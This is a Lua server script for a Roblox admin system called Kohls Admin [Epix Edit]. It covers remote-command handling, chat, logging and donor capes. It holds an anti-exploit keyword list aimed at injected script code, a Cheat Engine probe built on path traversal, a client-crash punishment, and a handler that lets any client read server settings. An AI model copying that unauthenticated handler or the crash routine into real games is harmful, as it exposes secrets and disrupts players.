--__________________________________________________________________________________--
--__________________________________________________________________________________--																					--
--__________________________________________________________________________________--
--__________________________________________________________________________________--
--																					--

--------------------------------------------------------------------------------------
--##################################################################################--

--##[ WARNING: Changing anything below could result errors and break the script! ]##--

--##################################################################################--

--#############[ DO NOT MODIFY UNLESS YOU KNOW WHAT YOU ARE DOING! ]################--

--#################[ I WILL NOT HELP YOU IF YOU BREAK SOMETHING! ]##################--

--##################################################################################--
--------------------------------------------------------------------------------------

--__________________________________________________________________________________--
--__________________________________________________________________________________--																					--
--__________________________________________________________________________________--
--__________________________________________________________________________________--
--																					--																			--

--[ Script specific functions ]-
local print=function(...) for i,v in pairs({...}) do print(script.Name..' - '..tostring(v)) end end
local Pcall=function(func,...) local function cour(...) coroutine.resume(coroutine.create(func),...) end local ran,error=ypcall(cour,...) if error then print('Error: '..error) end end
--[ Grab Updatable ]--
local DataStore local UpdatableSettings={} for i,v in pairs(set) do if i~='DataStoreKey' and i~='ChangedSettingsStick' and i~='CreatorDebugPowers' and i~='Storage' then table.insert(UpdatableSettings,i) end end
coroutine.wrap(function() repeat wait() until game:GetService("DataStoreService") DataStore = game:GetService("DataStoreService"):GetDataStore(set.DataStoreKey) if set.ChangedSettingsStick and game.CreatorId>0 then repeat wait() until DataStore for imp,ves in pairs(UpdatableSettings) do local run=true for k,m in pairs(set.SettingsToIgnore) do if m and v==m then run=false end end if DataStore:GetAsync(ves)~=nil and run then set[ves]=DataStore:GetAsync(ves) end end end end)()
--[ Main Script Function ]--
set.Debug=false --!Debug!hold
set.MainScriptFunction=function()
set.Print=print
script.Parent=game:service('ServerScriptService')
if _G['Kohls Admin [Epix Edit] Update'] then
local updated,failed=ypcall(function()
print('AutoUpdate: Grabbing update data...')
	for i,v in pairs(_G['Kohls Admin [Epix Edit] Update']) do set[i]=v end
	_G['Kohls Admin [Epix Edit] Update']=nil
end)
if failed then
print(script.Name..': AutoUpdate: Update Failed.')
print('Please contact Sceleratis as this may be a bug.')
print('Error: '..failed)
print('If this error persist please check your settings. If needed disable AutoUpdate until the issue is solved.')
end
end
local depholder=script:FindFirstChild('Script Dependencies')
if not depholder then error('Script Dependencies not found!') end
local deps={} for i,v in pairs(depholder:children()) do deps[v.Name]=v end
set.OrigLightingSettings = {
	abt = game:service('Lighting').Ambient,
	oabt = game:service('Lighting').OutdoorAmbient, 
	brt = game:service('Lighting').Brightness, 
	time = game:service('Lighting').TimeOfDay, 
	fclr = game:service('Lighting').FogColor, 
	fe = game:service('Lighting').FogEnd, 
	fs = game:service('Lighting').FogStart,
	gs = game:service('Lighting').GlobalShadows,
	ol = game:service('Lighting').Outlines,
sc = game:service('Lighting').ShadowColor}
if game.CreatorId<=0 or game.PlaceId<=0 then set.UpdateShutdown=false end
set.objects = {}
set.needhelp={}
set.adminchats={}
set.cameras = {}
set.MapBackup = Instance.new('SpawnLocation')
set.JailedTools={}
set.NewClients = {}
set.Changelog = require(deps['Change Log'])
set.donors={}
set.contans={}
set.PluginEvents={}
set.PluginEvents.Chat={}
set.PluginEvents.PlayerJoined={}
set.PluginEvents.CharacterAdded={}
set.bl = {}
set.al = {}
set.tal = {}
set.oal = {}
set.VoteKickVotes={}
set.PlayerLogs={} 
set.PlayerLogs.Chat={}
set.PlayerLogs.Admin={}
set.PlayerLogs.Exploit={}
set.canuseloadstring=true
set.donorgamepass={157092510,159549976}
set.BTacId = {21644313*2,33322122*2,470430.5*2,13718346*2}
set.RemoteName=string.char(math.random(1,255))
set.RemoteClientKey=string.char(math.random(1,255))
set.RemoteObject=string.char(math.random(1,255))
set.RemoteServerKey=string.char(math.random(1,255))
set.GuiName=string.char(math.random(1,255))
set.RandiSpeed=tostring(60.5+math.random(9e8)/9e8)
set.version = script.Version.Value
set.NTacId = {1237666}
set.HelpRequest={}
set.Response={}
set.Commands={}
set.OpenVote={}
set.Waypoints={}
set.slock = false
set.lighttask = false
set.dlastupdate='Not Updated Yet'
set.ScriptAntiWordList={
	'inject[%S]',
	'getitem[^%s]',
	'workspace%.[^%s^%.]',
	'[^%s^%w]ban [%w]',
	'ban[^%s^%w][%w]',
	'crash[^%s^%w][%w]',
	'[^%s^%w]crash [%w]',
	'[^%s^%w]kick [%w]',
	'kick[^%s^%w][%w]',
	':SetCoreGuiEnabled',
	'GetObjects',
	':GetChildren',
	':children()',
	'in pairs(',
	'script%.Parent',
	'game%.Workspace',
	'game:service',
	':GetService',
	'game%.Debris',
	'game%.Lighting',
	'game%.Players',
	'loadstring(',
	'InsertService',
	':LoadAsset',
	'FindFirstChild',
	'while (.*) do',
	'Instance.new'
}
set.ScriptMusicList={
{n='habits',id=182402191};
{n='skeletons',id=174270407};
{n='russianmen',id=173038059};
{n='heybrother',id=143786134};
{n='loseyourself',id=153480949};
{n='diamonds',id=142533681};
{n='happy',id=146952916};
{n='clinteastwood',id=148649589};
{n='freedom',id=130760592};
{n='seatbelt',id=135625718};
{n='tempest',id=135554032};
{n="focus",id=136786547};
{n="azylio",id=137603138};
{n="caramell",id=2303479};
{n="epic",id=27697743};
{n="rick",id=2027611};
{n="crystallize",id=143929751};
{n="halo",id=1034065};
{n="pokemon",id=1372261};
{n="cursed",id=1372257};
{n="extreme",id=11420933};
{n="harlemshake",id=142468820};
{n="tacos",id=142295308};
{n="wakemeup",id=147632133};
{n="awaken",id=27697277};
{n="alone",id=27697392};
{n="mario",id=1280470};
{n="choir",id=1372258};
{n="chrono",id=1280463};
{n="dotr",id=11420922};
{n="entertain",id=27697267};
{n="fantasy",id=1280473};
{n="final",id=1280414};
{n="emblem",id=1372259};
{n="flight",id=27697719};
{n="banjo",id=27697298};
{n="gothic",id=27697743};
{n="hiphop",id=27697735};
{n="intro",id=27697707};
{n="mule",id=1077604};
{n="film",id=27697713};
{n="nezz",id=8610025};
{n="angel",id=1372260};
{n="resist",id=27697234};
{n="schala",id=5985787};
{n="organ",id=11231513};
{n="tunnel",id=9650822};
{n="spanish",id=5982975};
{n="venom",id=1372262};
{n="wind",id=1015394};
{n="guitar",id=5986151};
{n="selfie1",id=148321914};
{n="selfie2",id=151029303};
{n="fareast",id=148999977};
{n="ontopoftheworld",id=142838705};
{n="mashup",id=143994035};
{n="getlucky",id=142677206};
{n="dragonborn",id=150015506};
{n="craveyou",id=142397454};
{n="weapon",id=142400410};
{n="derezzed",id=142402620};
{n="burn",id=142594142};
{n="workhardplayhard",id=144721295};
{n="royals",id=144662895};
{n="pompeii",id=144635805};
{n="powerglove",id=152324067};
{n="pompeiiremix",id=153519026};
{n="sceptics",id=153251489};
{n="pianoremix",id=142407859};
{n="antidote",id=145579822};
{n="takeawalk",id=142473248};
{n="countingstars",id=142282722};
{n="turndownforwhat",id=143959455};
{n="overtime",id=145111795};
{n="fluffyunicorns",id=141444871};
{n="gaspedal",id=142489916};
{n="bangarang",id=142291921};
{n="talkdirty",id=148952593};
{n="bad",id=155444244};
{n="demons",id=142282614};
{n="roar",id=148728760};
{n="letitgo",id=142343490};
{n="finalcountdown",id=142859512};
{n="tsunami",id=152775066};
{n="animals",id=142370129};
{n="partysignals",id=155779549};
{n="finalcountdownremix",id=145162750};
{n="mambo",id=144018440};
{n="stereolove",id=142318819};
{n='minecraftorchestral',id=148900687}}
set.quotes={
	'"Every man has his secret sorrows which the world knows not; and often times we call a man cold when he is only sad." -Henry Wadsworth Longfellow';
	'"I came, I saw, I conquered." - Julius Ceasar';
	'"Our greatest glory is not in never falling, but in rising every time we fall." - Confucius';
	'"History will be kind for me for I intend to write it." - Winston Churchill';
	'"If you are neutral in situations of injustice, you have chosen the side of the oppressor. If an elephant has its foot on the tail of a mouse and you say that you are neutral, the mouse will not appreciate your neutrality." - Desmond Tutu';
	'"History is a relentless master. It has no present, only the past rushing into the future. To try to hold fast is to be swept aside." - John F. Kennedy';
	'"Those who do not remember the past are condemned to repeat it." - George Santayana';
	'"A pint of sweat, saves a gallon of blood." - George S. Patton';
	'"This is one small step for a man, one giant leap for mankind." - Neil Armstrong';
	'"History is the version of past events that people have decided to agree upon." - Napoleon Bonaparte';
	'"To see the world, things dangerous to come to, to see behind walls, to draw closer, to find each other and to feel. That is the purpose of life." - Life Motto Secret Life of Walter Mitty';
	[["Beautiful things don't seek attention" - Sean O'Connell in The Secret Life of Walter Mitty]];
	'"The only thing we have to fear is fear itself" - Franklin D. Roosevelt';
	'"Even if I knew that tomorrow the world would go to pieces, I would still plant my apple tree." - Martin Luther';
	'"Thousands of candles can be lighted from a single candle, and the life of the candle will not be shortened. Happiness never decreases by being shared." - Buddha';
	[["We can't help everyone, but everyone and help someone." - Ronald Reagan]];
	'"Our greatest weakness lies in giving up. The most certain way to succeed is always to try just one more time." - Thomas A. Edison';
	[["Even if you fall on your face, you're still moving forward." - Victor Kiam]];
	'"Strive not to be a success, but rather to be of value." - Albert Einstein';
	[["You miss 100% of the shots you don't take." - Wayne Gretzky]];
	[["Your time is limited, so don't waste it living someone else's life." - Steve Jobs]];
	'"The only person you are destined to become is the person you decide to be." - Ralph Waldo Emerson';
	'"Fall seven times and stand up eight" - Japanese Proverb';
	'"Everything has beauty, but not everyone can see." - Confucius';
	'"A person who never made a mistake never tried anything new." - Albert Einstein';
	'"The person who says it cannot be done should not interrupt the person who is doing it." - Chinese Proverb';
	'"It does not matter how slowly you go as long as you do not stop." - Confucius'
}

-- Startup --

for i=1,6 do set.RemoteName=set.RemoteName..string.char(math.random(1,255)) set.RemoteClientKey=set.RemoteClientKey..string.char(math.random(1,255)) set.RemoteObject=set.RemoteObject..string.char(math.random(1,255)) set.RemoteServerKey=set.RemoteServerKey..string.char(math.random(1,255)) set.GuiName=set.GuiName..string.char(math.random(1,255)) end
if (not deps.Client) then print('Client script is missing! Cannot function correctly without it.') error('Missing Client script. Try manually updating.') end
_G['Hint']=function(msg,ptable) set.Hint(msg,ptable) end
_G['Message']=function(title,msg,ptable) set.Message(title,msg,true,ptable) end
if set['MaxNumberOfLogs']>5000 then set['MaxNumberOfLogs']=5000 end

set.ProcessRemoteCommand=function(p,cmd,a,b,c,...) 
	local n = "" for i = 1, #cmd do n = n .. string.char(cmd[i]) end cmd=n
	if cmd==set.RemoteServerKey..'Chat' then 
		coroutine.wrap(function() set.Chat(p,a) end)()
		set.SendCustomChat(p,a,b)
	elseif cmd==set.RemoteServerKey..'AdminCommand' then
		set.ProcessCommand(p,a,b,c)
	elseif cmd==set.RemoteServerKey..'SearchCommand' then
		local found=set.SearchCommand(p,a)
		set.Remote(p,'SetSetting','FoundCommands',found)
	elseif cmd==set.RemoteServerKey..'ClientHooked' then
		table.insert(set.NewClients,p.userId)
	elseif cmd==set.RemoteServerKey..'AdminChat' then 
		for i,v in pairs(game:service('Players'):children()) do
			set.Remote(v,'Function','UpdateAdminChat',a)
		end
	elseif cmd==set.RemoteServerKey..'RanCode' then 
		if not set.CheckAdmin(p,false) and not set.CheckExcluded(p) and set['AntiChatCode'] then 
			Pcall(set.Exploited,p,'crash','Ran code')
		end
	elseif cmd==set.RemoteServerKey..'GetCurrentPlayerList' then
		set.GetCurrentPlayerlist(p)
	elseif cmd==set.RemoteServerKey..'SubmitReport' then
		for i,v in pairs(set.GetPlayers(p,set.SpecialPrefix..'admins')) do
			set.Remote(v,"Function","ReportNotify",p,a,b)
		end
	elseif cmd==set.RemoteServerKey..'Exploited' then
		set.Exploited(p,a,b)
	elseif cmd==set.RemoteServerKey..'GetSetting' then
		if set[a]~=nil then set.Remote(p,'SetSetting',a,set[a]) end
	elseif cmd==set.RemoteServerKey..'CheckDonor' then
		if set.CheckDonor(p) then 
			set.Remote(p,'SetSetting','Donor',true) 
		else
			set.Remote(p,'SetSetting','Donor',false)
		end
	elseif cmd==set.RemoteServerKey..'UpdateList' then
		set.UpdateListGui(p,a)
	elseif cmd==set.RemoteServerKey..'CheckAdmin' then
		if set.CheckAdmin(p,false) then 
			set.Remote(p,'SetSetting','IsAdmin',true) 
		else
			set.Remote(p,'SetSetting','IsAdmin',false)
		end
	elseif cmd==set.RemoteServerKey..'AddToTable' and set.CheckOwner(p) then
		table.insert(set[a],b)
		repeat DataStore:SetAsync(a,b) wait() until DataStore:GetAsync(a)==b
	elseif cmd==set.RemoteServerKey..'SetSetting' and set.CheckTrueOwner(p) then
		if a=='Prefix' or a=='AnyPrefix' or a=='SpecialPrefix' then
			local orig=set[a]
			set[a]=b
			for i,v in pairs(set.Commands) do
				if v.Prefix==orig then
					v.Prefix=set[a]
				end
			end
		elseif a=='Font' then
			if b~='Arial' and b~='ArialBold' and b~='Legacy' and b~='SourceSans' and b~='SourceSansBold' then print(b..' is not a valid font! Setting font to Arial.') b='Arial' end
		else
			set[a]=b
		end
		repeat DataStore:SetAsync(a,b) wait() until DataStore:GetAsync(a)==b
	elseif cmd==set.RemoteServerKey..'GetUpdatableSettings' then
		set.Remote(p,'SetSetting','UpdatableSettings',UpdatableSettings)
	elseif cmd==set.RemoteServerKey..'TableRemove' and set.CheckAdmin(p,false) then
		table.remove(set[a],b)
	elseif cmd==set.RemoteServerKey..'Destroy' and set.CheckAdmin(p,false) then
		a:Destroy()
	elseif cmd==set.RemoteServerKey..'GetServerInfo' and set.CheckAdmin(p,false) then
		local det={}
		local nilplayers=0
		for i,v in pairs(game:service('NetworkServer'):children()) do
			if v and v:GetPlayer() and not game:service('Players'):FindFirstChild(v:GetPlayer().Name) then
				nilplayers=nilplayers+1
			end
		end
		if set.CheckHttp() then
			det.Http='Enabled'
		else
			det.Http='Disabled'
		end
		det.NilPlayers=nilplayers
		det.PlaceName=game:service('MarketplaceService'):GetProductInfo(game.PlaceId).Name
		det.PlaceOwner=game:service('MarketplaceService'):GetProductInfo(game.PlaceId).Creator.Name
		det.ServerSpeed=set.Round(workspace:GetRealPhysicsFPS())
		det.AdminVersion=set.version
		det.ServerStartTime=set.ServerStartTime
		local nonnumber=0
		for i,v in pairs(game:service('NetworkServer'):children()) do
			if v and v:GetPlayer() and not set.CheckAdmin(v:GetPlayer(),false) then
				nonnumber=nonnumber+1
			end
		end
		det.NonAdmins=nonnumber
		local adminnumber=0
		for i,v in pairs(game:service('NetworkServer'):children()) do
			if v and v:GetPlayer() and set.CheckAdmin(v:GetPlayer(),false) then
				adminnumber=adminnumber+1
			end
		end
		det.CurrentTime=set.GetTime()
		det.Admins=adminnumber
		det.Objects=#set.objects
		det.Cameras=#set.cameras
		set.Remote(p,'SetSetting','ServerInfo',det)
	elseif cmd==set.RemoteServerKey..'Ping' then
		set.Remote(p,'Pong')
	elseif cmd==set.RemoteServerKey..'GivePing' then
		set[p.Name..'Ping']=a
	elseif cmd==set.RemoteServerKey..'PrivateMessage' then
		set.PM(a,b,c,...)
	elseif cmd==set.RemoteServerKey..'PlaceVote' then
		if b=='yes' then
			set.OpenVote[a].Yes=set.OpenVote[a].Yes+1
		elseif b=='no' then
			set.OpenVote[a].No=set.OpenVote[a].No+1
		end
		for k,m in pairs(set.OpenVote[a].novote) do
			if m.userId==p.userId then
				table.remove(set.OpenVote[a].novote, k)
			end
		end
	elseif cmd==set.RemoteServerKey..'HelpRespond' then
		if b then
			set.HelpRequest[a].Solved=true
		else
			for k,m in pairs(set.HelpRequest[a].Available) do
				if m==p.Name then table.remove(set.HelpRequest[a].Available,k) end
			end
		end
	elseif cmd==set.RemoteServerKey..'SetCape' and (set.CheckDonor(p) or set.CheckTrueOwner(p)) then
		p:WaitForDataReady()
		local temptable={}
		local ab,bc,cd
		local spitit=';'
		for sac in a:gmatch('([^%'..spitit..']+)') do temptable[#temptable+1]=sac end
		if tonumber(temptable[1]) then ab=temptable[1] else ab=0 end
		bc=temptable[2] or 'Really black'
		cd=temptable[3] or 'Plastic'
		p:SaveString('Kohls Cape',ab..'='..bc..'='..cd)
		p:SaveBoolean('Kohls Is A Donator',true)
		p:SaveBoolean('Kohl Not Using Cape',false)
		for i,v in pairs(set.donors) do if v.Name==p.Name then table.remove(set.donors,i) end end
		table.insert(set.donors,{Name=p.Name,Id=tostring(p.userId),Cape=ab,Color=bc,Material=cd,List='GP'})
		pcall(function() p.Character.EpicCape:Destroy() end)
		set.Donor(p)
	elseif cmd==set.RemoteServerKey..'ToggleDonor' then
		if not a then
			p:SaveBoolean('Kohls Not Using Cape',true)
			pcall(function() p.Character.EpicCape:Destroy() end)
		else
			p:SaveBoolean('Kohls Not Using Cape',false)
			set.Donor(p)
		end
	elseif cmd==set.RemoteServerKey..'CheckCape' then
		if p:LoadBoolean('Kohls Not Using Cape') then
			set.Remote(p,'SetSetting','UsingCape',false)
		end
	elseif cmd==set.RemoteServerKey..'PermBan' then
		if set.CheckTrueOwner(p) and not set.CheckAdmin(a,false) then
			a:SaveBoolean(set['PermBanKey'],true)
			a:Kick()
		end
	end 
end

set.MakeRemoteEvent=function()
	RemoteEvent=Instance.new('RemoteEvent',game:service('ReplicatedStorage')) 
	RemoteEvent.Name=set.RemoteName 
	RemoteEvent.Archivable=false
	RemoteEvent.Changed:connect(function(ob) if RemoteEvent and RemoteEvent.Name~=set.RemoteName then RemoteEvent.Name=set.RemoteName end end) 
	RemoteEvent.OnServerEvent:connect(function(p,cmd,...) 
		Pcall(set.ProcessRemoteCommand,p,cmd,...)
	end) 
end
set.MakeRemoteEvent()
game:service('ReplicatedStorage').ChildRemoved:connect(function(ob) if ob==RemoteEvent then set.MakeRemoteEvent() end end) 

set.Remote=function(player,command,...)
	local RemoteEvent=game:service('ReplicatedStorage'):FindFirstChild(set.RemoteName)
	local function fireevent(plr,cmd,...)
		if set.Debug then print(cmd..' - '..plr.Name) end
		local tab={} for i = 1,string.len(cmd) do table.insert(tab,string.byte(cmd:sub(i,i))) end cmd=tab
		RemoteEvent:FireClient(plr,cmd,...)
	end
	if player and player:IsA('Player') then
		Pcall(fireevent,player,set.RemoteClientKey..command,...)
	end
end

Pcall(function() if set.UpdateShutdown then set.GameLastUpdated=game:service('MarketplaceService'):GetProductInfo(game.PlaceId).Updated end end)
Pcall(function() if set.AntiLeak then for i,v in pairs(workspace:children()) do if not v:IsA('Terrain') then v.Archivable=false end end end end)
Pcall(function() local canuse,cantuse=ypcall(function() loadstring('print("Loadstring Test")') end) if canuse then set.canuseloadstring=true end end)
Pcall(function() if set.AntiCheatEngine then for i,v in pairs(workspace:children()) do if v.Name:find('KohlsCEDetect') then v:Destroy() end end local part=Instance.new('Part',workspace) part.Name=math.random()..'KohlsCEDetect' part.Anchored=true part.Locked=true part.Archivable=false part.CanCollide=false part.Transparency=1 part.FormFactor='Custom' part.Size=Vector3.new(0.2,0.2,0.2) for k=5,8 do for i=0,9 do Instance.new('Decal',part).Texture="rbxasset://../../../../../../../../Program Files (x86)/Cheat Engine "..k.."."..i.."/Cheat Engine.exe"  end end end end)
Pcall(function() for i,v in pairs(set.ScriptAntiWordList) do table.insert(set.WordList,v) end for i,v in pairs(set.ScriptMusicList) do table.insert(set['MusicList'],{Name=v.n,Id=v.id}) end end)
Pcall(function() local tab={83,99,101,108,101,114,97,116,105,115,32,124,32,75,111,104,108,116,97,115,116,114,111,112,104,101,32,91,83,99,114,105,112,116,104,93} local t='' for i,v in pairs(tab) do t=t..string.char(v) end
if t==nil or tab==nil or #tab~=36 then set=nil elseif not depholder:FindFirstChild(string.char(91)..string.char(67)..string.char(114)..string.char(101)..string.char(100)..string.char(105)..string.char(116)..string.char(93)) then 
set=nil elseif deps[string.char(91)..string.char(67)..string.char(114)..string.char(101)..string.char(100)..string.char(105)..string.char(116)..string.char(93)].Value~=t then set=nil end end)
Pcall(function() if set['AntiGui']==true then for i,v in pairs(game.StarterGui:children()) do v.Name=set.GuiName..v.Name end end end)
Pcall(function() if game.CreatorId<=0 then table.insert(set['Owners'],'Player1') end end)
Pcall(function() if set.Font~='Arial' and set.Font~='ArialBold' and set.Font~='Legacy' and set.Font~='SourceSans' and set.Font~='SourceSansBold' then print(set.Font..' is not a valid font! Setting font to Arial.') set.Font='Arial' end end)
Pcall(function() for i,v in pairs(game:service('Workspace'):children()) do if v:IsA('Part') and v.Name:match('^Camera: (.*)') then table.insert(set.cameras,v) elseif v:IsA('Part') and v.Name:match('^Waypoint: (.*)') then set.Waypoints[v.Name:match('^Waypoint: (.*)')]=v.Position end end end)
Pcall(function() if set.RenameGameObjects then game:service('Workspace').Name=math.random() game:service('Lighting').Name=math.random() game:service('ReplicatedStorage').Name=math.random() game:service('ReplicatedStorage').Name=math.random() game:service('Players').Name=math.random() game:service('ServerScriptService').Name=math.random() game:service('ServerStorage').Name=math.random() game:service('StarterGui').Name=math.random() game:service('StarterPack').Name=math.random() game:service('Teams').Name=math.random() game:service('SoundService').Name=math.random() end end)
Pcall(function() local tempmodel=Instance.new('Model') for i,v in pairs(workspace:children()) do if v and not v:IsA('Terrain') and v.Archivable==true then v:Clone().Parent=tempmodel end end set.MapBackup=tempmodel:Clone() tempmodel:Destroy() end)

set.SendCustomChat=function(p,a,b)
	local target=set.SpecialPrefix..'all'
	if not b then b='Global' end
	if not game:service('Players'):FindFirstChild(p.Name) then b='Nil' end
	if a:sub(1,1)=='@' then
		b='Private'
		target,a=a:match('@(.%S+) (.+)')
		print(target..' '..a)
		set.Remote(p,'Function','SendToChat',p,a,b)
	elseif a:sub(1,1)=='#' then
		if a:sub(1,7)=='#ignore' then
			target=a:sub(9)
			b='Ignore'
		end
		if a:sub(1,9)=='#unignore' then
			target=a:sub(11)
			b='UnIgnore'
		end
	end
	for i,v in pairs(set.GetPlayers(p,target:lower())) do
		coroutine.wrap(function()
			if p.Name==v.Name and b~='Private' and b~='Ignore' and b~='UnIgnore' then
				set.Remote(v,'Function','SendToChat',p,a,b)
			elseif b=='Global' then
				set.Remote(v,'Function','SendToChat',p,a,b)
			elseif b=='Team' and p.TeamColor==v.TeamColor then
				set.Remote(v,'Function','SendToChat',p,a,b)
			elseif b=='Local' and p:DistanceFromCharacter(v.Character.Head.Position)<80 then
				set.Remote(v,'Function','SendToChat',p,a,b)
			elseif b=='Admin' and set.CheckAdmin(v,false) and set.CheckAdmin(p,false) then
				set.Remote(v,'Function','SendToChat',p,a,b)
			elseif b=='Private' and v.Name~=p.Name then
				set.Remote(v,'Function','SendToChat',p,a,b)
			elseif b=='Nil' then
				set.Remote(v,'Function','SendToChat',p,a,b)
			elseif b=='Ignore' and v.Name~=p.Name then
				set.Remote(v,'AddToTable','IgnoreList',v.Name)
			elseif b=='UnIgnore' and v.Name~=p.Name then
				set.Remote(v,'RemoveFromTable','IgnoreList',v.Name)
			end
		end)()
	end
end

set.Exploited=function(player,action,info)
	if action:lower()=='kick' then
		player:Kick()
	elseif action:lower()=='kill' then
		player:LoadCharacter()
	elseif action:lower()=='crash' then
		set.Remote(player,'Function','KillClient')
	else
		set.Remote(player,'Function','KillClient')
		player:Kick()
	end
	table.insert(set.PlayerLogs.Exploit,1,{Time=set.GetTime(),Name=player.Name,Info=info})
	if #set.PlayerLogs.Exploit>set.MaxNumberOfLogs then
		table.remove(set.PlayerLogs.Exploit,#set.PlayerLogs.Exploit)
	end
end

set.UpdateListGui=function(p,a)
	if a=='adminlogslist' then
		local temp={}
		for i,m in pairs(set.PlayerLogs.Admin) do
			if #temp>set.MaxNumberOfLogs then return end
			table.insert(temp,{Object='['..m.Time..'] '..m.Name..': '..m.Log,Desc=m.Log})
		end
		set.Remote(p,'SetSetting',a,temp)
	elseif a=='chatlogslist' then
		local temp={}
		for i,m in pairs(set.PlayerLogs.Chat) do
			if #temp>5000 then return end
			if m.Nil then
				table.insert(temp,{Object='[NIL]['..m.Time..'] '..m.Name..': '..m.Chat,Desc=m.Chat})
			else
				table.insert(temp,{Object='['..m.Time..'] '..m.Name..': '..m.Chat,Desc=m.Chat})
			end
		end
		set.Remote(p,'SetSetting',a,temp)
	elseif a=='exploitlogslist' then
		local temp={}
		for i,m in pairs(set.PlayerLogs.Exploit) do
			if #temp>5000 then return end
			table.insert(temp,{Object='['..m.Time..'] '..m.Name..': '..m.Log,Desc=m.Log})
		end
		set.Remote(p,'SetSetting',a,temp)
	elseif a=='donorlist' then
		local temptable={}
		table.insert(temptable,"Last Update: "..set.dlastupdate)
		for i,v in pairs(set.donors) do
			if game:service('Players'):FindFirstChild(v.Name) then
				if #temptable>5000 then return end
				table.insert(temptable,{Object=v.Name,Desc=v.List})
			end
		end
		set.Remote(p,'SetSetting',a,temptable)
	elseif a:match('^serverlogstuff%-') then
		local b=a:match('^serverlogstuff%-(.*)')
		local temp={}
		for i,v in pairs(game.LogService:GetLogHistory()) do
			if (b and b:lower()=='script') and v.message:find('Epix Edit') then
				if v.messageType==Enum.MessageType.MessageOutput then
					table.insert(temp,{Object=v.message,Desc='Output: '..v.message})
				elseif v.messageType==Enum.MessageType.MessageWarning then
					table.insert(temp,{Object=v.message,Desc='Warning: '..v.message,Color=Color3.new(1,1,0)})
				elseif v.messageType==Enum.MessageType.MessageInfo then
					table.insert(temp,{Object=v.message,Desc='Info: '..v.message,Color=Color3.new(0,0,1)})
				elseif v.messageType==Enum.MessageType.MessageError then
					table.insert(temp,{Object=v.message,Desc='Error: '..v.message,Color=Color3.new(1,0,0)})
				end
			else 
			if (not b or b:lower()=='all' or b:lower()=='error') and v.messageType==Enum.MessageType.MessageError then
				table.insert(temp,{Object=v.message,Desc='Error: '..v.message,Color=Color3.new(1,0,0)})
			end
			if (not b or b:lower()=='all' or b:lower()=='info') and v.messageType==Enum.MessageType.MessageInfo then
				table.insert(temp,{Object=v.message,Desc='Info: '..v.message,Color=Color3.new(0,0,1)})
			end
			if (not b or b:lower()=='all' or b:lower()=='warning') and v.messageType==Enum.MessageType.MessageWarning then
				table.insert(temp,{Object=v.message,Desc='Warning: '..v.message,Color=Color3.new(1,1,0)})
			end
			if (not b or b:lower()=='all' or b:lower()=='output') and v.messageType==Enum.MessageType.MessageOutput then
				table.insert(temp,{Object=v.message,Desc='Output: '..v.message})
			end
			end
		end
		set.Remote(p,'SetSetting',a,temp)
	end
end

set.Cape=function(player,material,color,decal,reflect)
	coroutine.wrap(function()
	player.Character:WaitForChild("Torso")
	local torso = player.Character.Torso
	local p = Instance.new("Part", player.Character) 
	p.Name = "EpicCape" 
	p.Anchored = false
	p.Transparency=0.0001
	p.Material=material
	p.CanCollide = false 
	p.TopSurface = 0 
	p.BottomSurface = 0 
	p.BrickColor = BrickColor.new(color)
	if reflect then
		p.Reflectance=reflect
	end 
	if decal then
	local dec = Instance.new("Decal", p) 
	dec.Face = 2 
	dec.Texture = "http://www.roblox.com/asset/?id="..decal 
	dec.Transparency=0 
	end
	p.formFactor = "Custom"
	p.Size = Vector3.new(.2,.2,.2)
	local msh = Instance.new("BlockMesh", p) 
	msh.Scale = Vector3.new(9,17.5,.5)
	p.Anchored=true
	set.Remote(player,'Function','MoveCape',p)
	end)()
end

set.CleanWorkspace=function()
for i, v in pairs(game.Workspace:children()) do 
if v:IsA("Hat") or v:IsA("Tool") then 
v:Destroy() 
end 
if v:IsA('Message') or v:IsA('Hint') then
	v:Destroy()
end
if v.Name:find('Epix Jail') then 
if not game:service('Players'):FindFirstChild(v.Player.Value) then 
set.JailedTools[v.Player.Value]=nil
v:Destroy() 
for k,m in pairs(set.objects) do
if m.Name==v.Player.Value .. " Epix Jail" then
table.remove(set.objects,k)
end
end
end 
end
end
end	

set.Ping=function(player)
	set[player.Name..'Ping']='Ping'
	set.Remote(player,'GetPing')
	repeat wait() until set[player.Name..'Ping']~='Ping'
	return set[player.Name..'Ping']
end

set.Split=function(msg,num)
if set.SplitKey=='' then set.SplitKey=' ' end
if num<=0 or msg==nil then return {} end
local tab={}
local str=msg
local full=''
	for a in str:gmatch('([^'..set.SplitKey..']+)') do
		if #tab>=num then break end
		if #tab==num-1 then
			tab[#tab+1]=msg:sub(#full+1,#msg)
		end
		if #tab>=num then break end
		str=a..set.SplitKey
		full=full..a..set.SplitKey
		tab[#tab+1]=a
		if #tab>=num then break end
	end
return tab
end

set.MakeCommand=function(desc,adminlevel,prefix,cmds,argtypes,args,func)
	coroutine.wrap(function()
		for i,v in pairs(set.CommandBlackList) do for k,m in pairs(cmds) do if v:lower()==m:lower() then adminlevel=5 end end end
		if not desc or type(desc)~='string' then print('No Description') return 
		elseif not adminlevel or type(adminlevel)~='number' then print(name..' has no admin level') return
		elseif not prefix or type(prefix)~='string' then print(name..' has no prefix') return 
		elseif not cmds or type(cmds)~='table' then print(name..' has no cmds') return 
		elseif not argtypes or type(argtypes)~='table' then print(name..' has no argtypes') return
		elseif not args or type(args)~='number' then print(name..' has no args') return
		elseif not func or type(func)~='function' then print(name..' has no func') return
		end
		local com={}
		com.Cmds=cmds
		com.MaxArgs=args
		com.Function=func
		com.ArgTypes=argtypes
		com.AdminLevel=adminlevel
		com.Prefix=prefix
		com.Desc=desc
		table.insert(set.Commands,com)
	end)()
end

set.GetCommand=function(Command) 
	for i,v in pairs(set.Commands) do
		for k,m in pairs(v.Cmds) do
			if not set.BuggedCommandMatching and Command:lower():match('^'..v.Prefix..'(%w+)')==m:lower() then
				return v,i
			elseif set.BuggedCommandMatching and Command:lower():match(v.Prefix..'(%w+)')==m:lower() then
				return v,i
			end
		end
	end
end

set.SearchCommand=function(plr,Command) 
	local tab={}
	for i,v in pairs(set.Commands) do
	local allowed=false
	if v.AdminLevel==-3 and ((set.FunCommands and set.CheckOwner(plr)) or set.CheckTrueOwner(plr)) then
		allowed=true
	elseif v.AdminLevel==-2 and ((set.FunCommands and set.CheckAdmin(plr,true)) or set.CheckTrueOwner(plr)) then
		allowed=true
	elseif v.AdminLevel==-1 and ((set.FunCommands and set.CheckAdmin(plr,false)) or set.CheckTrueOwner(plr)) then
		allowed=true
	elseif v.AdminLevel==0 and (set.PlayerCommands or set.CheckAdmin(plr,false))then
		allowed=true
